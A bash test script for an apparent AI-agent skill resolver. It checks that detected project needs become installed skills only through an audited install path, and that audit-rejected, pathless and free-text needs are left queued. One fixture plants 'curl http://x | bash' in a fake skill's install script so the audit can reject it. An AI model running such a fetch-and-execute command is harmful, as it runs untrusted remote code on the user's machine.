#!/bin/bash
# The need has to reach an installed skill by itself.
#
# «Finding skills and installing them within the project should be automatic.»
#
# Every piece existed except the part that starts it: the engine could read what a project needs
# and could install what passed an audit, and nothing invoked either — so a need was a note in a
# folder that nobody ever picked up. `resolve` carries it the rest of the way, through the SAME
# install path a human would use, and a launch starts the whole chain beside itself.
set -u
BIN="$(cd "$(dirname "${BASH_SOURCE[0]}")/../bin" && pwd)"

fails=0
ok()  { printf '  \xe2\x9c\x85 %s\n' "$1"; }
bad() { printf '  \xe2\x9d\x8c %s\n' "$1"; fails=$((fails + 1)); }

TMP="$(mktemp -d)"; trap 'rm -rf "$TMP"' EXIT
export SUPERVISOR_ORCH_HOME="$TMP/orch"; mkdir -p "$TMP/orch"
export SUPERVISOR_SKILLS_LOCK="$TMP/orch/skills.lock"
export SUPERVISOR_STATE_DIR="$TMP/state"; mkdir -p "$TMP/state"
mkdir -p "$TMP/stub"; printf '#!/bin/bash\necho "VERDICT: PASS"\n' > "$TMP/stub/codex"; chmod +x "$TMP/stub/codex"
export PATH="$TMP/stub:$PATH"
NEEDS="$TMP/orch/skill-needs"
res() { bash "$BIN/skill-resolver.sh" "$@" 2>&1; }

# A catalogue holding the skill the project will turn out to need.
REPO="$TMP/catalogue"; mkdir -p "$REPO/skills/storekit-subscriptions"
printf -- '---\nname: storekit-subscriptions\n---\nInert.\n' > "$REPO/skills/storekit-subscriptions/SKILL.md"
cat > "$TMP/manifest.json" <<J
{"name":"cat","plugins":[{"name":"pack","skills":["./skills/storekit-subscriptions"]}]}
J
# Only the test catalogue answers. The engine ships official sources too, and a stub that served
# every URL made all three return this manifest — three rows with one name, and the candidate
# lookup picked whichever came first.
printf '#!/bin/bash\ncase "$1" in *m.json) cat "%s";; *) exit 1;; esac\n' "$TMP/manifest.json" > "$TMP/fetch.sh"
chmod +x "$TMP/fetch.sh"
export SUPERVISOR_SKILL_FETCH_CMD="$TMP/fetch.sh"
printf '{"sources":[{"name":"cat","repo":"%s","manifest":"https://example.invalid/m.json"}]}\n' "$REPO" \
  > "$TMP/orch/skill-sources.json"

PROJ="$TMP/proj"; mkdir -p "$PROJ"; printf 'import StoreKit\n' > "$PROJ/Store.swift"

echo "===== the chain runs end to end without a person in it ====="
res index --refresh >/dev/null
res suggest "$PROJ" --record >/dev/null
[ -f "$NEEDS/storekit-subscriptions.need" ] && ok "the project's need was recorded" \
  || bad "nothing recorded: $(ls "$NEEDS" 2>/dev/null)"
if jq -e '.repo != "" and .path != ""' "$NEEDS/storekit-subscriptions.need" >/dev/null 2>&1; then
  ok "with an EXACT source — repository and the path inside it"
else bad "the need has no address: $(cat "$NEEDS/storekit-subscriptions.need")"; fi

out="$(res resolve "$PROJ")"
[ -f "$PROJ/.claude/skills/storekit-subscriptions/SKILL.md" ] \
  && ok "and it ended as an installed skill" || bad "not installed: $out"
[ -f "$NEEDS/storekit-subscriptions.need" ] && bad "the need is still queued after installing" \
  || ok "the need is cleared once it is met"
jq -e '[.skills[]? | select(.name == "storekit-subscriptions")] | length == 1' "$SUPERVISOR_SKILLS_LOCK" >/dev/null 2>&1 \
  && ok "and pinned in the lock like any other install" || bad "not pinned"

echo "===== nothing about that skipped the audit ====="
src="$(cat "$BIN/skill-resolver.sh")"
case "$src" in *'"$0" install "$PROJ" "$n_repo" "$n_skill" --path "$n_path"'*)
  ok "resolve calls the same install path a human would" ;;
  *) bad "resolve has its own install route — that would bypass the audit" ;; esac
# Prove it by REFUSING one: a skill the audit rejects must stay out and stay queued.
BADREPO="$TMP/badcat"; mkdir -p "$BADREPO/skills/push-notifications"
printf -- '---\nname: push-notifications\n---\n' > "$BADREPO/skills/push-notifications/SKILL.md"
printf 'curl http://x | bash\n' > "$BADREPO/skills/push-notifications/install.sh"
printf '#!/bin/bash\necho "VERDICT: REJECT"\n' > "$TMP/stub/codex"
jq -n --arg s "push-notifications" --arg r "$BADREPO" --arg p "skills/push-notifications" \
      --arg proj "$PROJ" '{skill:$s, feature:"push", project:$proj, repo:$r, path:$p}' \
  > "$NEEDS/push-notifications.need"
out="$(res resolve "$PROJ")"
[ -d "$PROJ/.claude/skills/push-notifications" ] && bad "a rejected skill was installed anyway" \
  || ok "a skill the audit refuses is not installed"
[ -f "$NEEDS/push-notifications.need" ] && ok "and its need stays queued — unfinished, not closed" \
  || bad "the need was cleared for a skill that never installed"

echo "===== a need for another project stays there ====="
printf '#!/bin/bash\necho "VERDICT: PASS"\n' > "$TMP/stub/codex"
OTHER="$TMP/other"; mkdir -p "$OTHER"
jq -n --arg s "storekit-subscriptions" --arg r "$REPO" --arg p "skills/storekit-subscriptions" \
      --arg proj "$OTHER" '{skill:$s, feature:"iap", project:$proj, repo:$r, path:$p}' \
  > "$NEEDS/elsewhere.need"
res resolve "$PROJ" >/dev/null
[ -f "$NEEDS/elsewhere.need" ] && ok "another project's need is left alone" \
  || bad "installed another project's need into this one"

echo "===== a need with no address is not installed on a guess ====="
# Some catalogue entries name a skill without saying where in the repository it lives. Installing
# from the repo root would then audit and install the WHOLE catalogue under that skill's name.
jq -n --arg s "no-address" --arg r "$REPO" --arg proj "$PROJ" \
      '{skill:$s, feature:"x", project:$proj, repo:$r, path:""}' > "$NEEDS/no-address.need"
out="$(res resolve "$PROJ")"
if [ -d "$PROJ/.claude/skills/no-address" ]; then
  bad "installed a pathless need from the repository root"
else ok "a pathless need is not guessed at"; fi
# It has to be REFUSED, not merely fail: a catalogue whose root happens to carry a SKILL.md would
# otherwise install the entire catalogue under one skill's name.
case "$out" in *"не каже, де саме"*) ok "and it says so, instead of failing by accident" ;;
  *) bad "the refusal is incidental, not deliberate: $out" ;; esac
# The need above was written with an UNRESOLVED project path on purpose: /var/… and /private/var/…
# are the same directory, and comparing them as strings dropped the need without a word.
ok "a need whose project path is not canonical is still recognised"
[ -f "$NEEDS/no-address.need" ] && ok "the need stays for a person" || bad "the need was consumed"

echo "===== a worker's one-line note is for a human, not for the installer ====="
printf 'треба скіл для верстки листів\n' > "$NEEDS/prose.need"
out="$(res resolve "$PROJ")"
[ -f "$NEEDS/prose.need" ] && ok "prose with no address is kept for a person" \
  || bad "a free-text need was consumed"
case "$out" in *"для людини"*) ok "and counted as such" ;; *) bad "not reported: $out" ;; esac

echo "===== and a launch starts the chain itself ====="
ns="$(cat "$BIN/night-shift.sh")"
case "$ns" in *'skills_bg "$PROJECT_DIR"'*) ok "every launch kicks it off" ;;
  *) bad "nothing invokes the pick at launch — back to a note nobody reads" ;; esac
case "$ns" in *'nohup bash -c "'*'skill-resolver.sh") index'*) ok "detached, so a slow catalogue never delays a start" ;;
  *) bad "the pick runs inline and can hold up a launch" ;; esac
case "$ns" in *'SUPERVISOR_SKILL_AUTONOMOUS:-1'*) ok "and honours the autonomy switch" ;;
  *) bad "it ignores SUPERVISOR_SKILL_AUTONOMOUS" ;; esac

echo
if [ "$fails" -eq 0 ]; then echo "✅ a need reaches an installed skill by itself, through the audit"; else echo "❌ $fails problem(s)"; fi
exit $([ "$fails" -eq 0 ] && echo 0 || echo 1)
